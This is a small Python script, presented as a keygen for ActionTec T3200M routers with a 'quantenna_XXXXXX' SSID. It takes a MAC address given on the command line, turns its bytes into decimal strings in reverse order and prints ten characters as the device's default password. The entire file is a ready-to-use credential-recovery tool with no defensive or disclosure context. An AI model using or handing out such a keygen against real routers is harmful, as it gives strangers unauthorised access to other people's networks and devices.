# algorithm pulled from an ActionTec T3200M /scripts/set_default_generated

import argparse

def quantenna(mac):
	
	mac_bytes = []
	mac_byte_values = []
	for i in range(0, 12, 2):
		mac_bytes.append(mac[i:i+2])
		mac_byte_values.append(int(mac[i:i+2], 16))
	mac_byte_value_strings = list(map(str, mac_byte_values))

	pwd_string = ''
	for i in reversed(range(0, 6)):
		pwd_string += mac_byte_value_strings[i]
	
	pwd = pwd_string[0:10]
	print(pwd)




parser = argparse.ArgumentParser(description='Keygen for ActionTec T3200M with SSID quantenna_XXXXXX')
parser.add_argument('mac', help='Mac address (mac+5)')
args = parser.parse_args()

quantenna(args.mac)